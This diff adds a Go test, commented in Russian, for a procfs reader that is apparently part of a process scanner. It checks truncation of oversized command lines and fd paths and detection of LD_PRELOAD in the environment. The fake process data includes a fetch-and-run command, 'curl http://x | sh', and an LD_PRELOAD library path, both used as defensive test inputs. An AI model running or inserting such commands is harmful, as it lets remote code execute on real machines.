@@ -4,7 +4,9 @@ package procfs_test
 // на поддельном дереве не может жить во внутреннем пакете procfs.
 
 import (
+	"runtime"
 	"slices"
+	"strings"
 	"testing"
 	"time"
 
@@ -84,5 +86,59 @@ func TestReadProcessFake(t *testing.T) {
 	}
 	if !found {
 		t.Errorf("сокет майнера не найден: %+v", socks)
+	}
+}
+
+// TestReadProcessLimits: данные процесса в /proc задаёт сам процесс, поэтому
+// командная строка и пути fd читаются с лимитом, а окружение — потоком.
+func TestReadProcessLimits(t *testing.T) {
+	now := time.Now()
+	tree := fakeproc.Demo(now)
+	// Длина цели симлинка: в Linux до 4 КБ, в macOS около 1 КБ — на macOS
+	// путь короче лимита и проверка обрезки пропускается.
+	longPath := 3000
+	if runtime.GOOS != "linux" {
+		longPath = 500
+	}
+	tree.Procs = append(tree.Procs, &fakeproc.Proc{PID: 5000, PPID: 1, Comm: "bash", UID: 1000, State: "S", StartTicks: 100,
+		Args: []string{"bash", "-c", strings.Repeat("A", 1<<20) + "; curl http://x | sh"},
+		Exe:  "/usr/bin/bash", Cwd: "/",
+		FDs: map[int]string{3: "/tmp/" + strings.Repeat("d", longPath)},
+		Env: []string{"X=" + strings.Repeat("v", 1<<20), "LD_PRELOAD=/tmp/x.so", "LD_AUDIT="}})
+	procRoot, hostRoot, err := tree.Write(t.TempDir())
+	if err != nil {
+		t.Fatal(err)
+	}
+	fs := fakeproc.NewFS(procRoot, hostRoot)
+	raw, err := fs.ReadProcess(5000, tree.BootTime)
+	if err != nil {
+		t.Fatal(err)
+	}
+	total := 0
+	for _, a := range raw.RawArgs {
+		total += len(a) + 1
+	}
+	if total > procfs.DefaultMaxCmdline+1 || !raw.Proc.CmdlineTruncated {
+		t.Errorf("cmdline: %d байт, truncated=%v", total, raw.Proc.CmdlineTruncated)
+	}
+	if !slices.Equal(raw.Proc.EnvFlags, []string{"LD_PRELOAD"}) {
+		t.Errorf("EnvFlags = %v (LD_PRELOAD после 1 МБ окружения, пустой LD_AUDIT не считается)", raw.Proc.EnvFlags)
+	}
+	if len(raw.Proc.Files) != 1 {
+		t.Fatalf("Files: %+v", raw.Proc.Files)
+	}
+	if tg := raw.Proc.Files[0].Target; len(tg) > procfs.MaxFDTarget+len("…") || (runtime.GOOS == "linux" && !strings.HasSuffix(tg, "…")) {
+		t.Errorf("путь fd не обрезан: %d байт", len(tg))
+	}
+
+	// Явные лимиты сканера.
+	raw, _ = fs.ReadProcessLimits(5000, tree.BootTime, procfs.Limits{Cmdline: 4096, Files: 0})
+	if n := len(strings.Join(raw.RawArgs, " ")); n > 4096 || len(raw.Proc.Files) != 0 {
+		t.Errorf("Limits: cmdline %d, files %d", n, len(raw.Proc.Files))
+	}
+	// Короткая командная строка не помечается.
+	raw, _ = fs.ReadProcess(3301, tree.BootTime)
+	if raw.Proc.CmdlineTruncated {
+		t.Error("обычная командная строка помечена как обрезанная")
 	}
 }
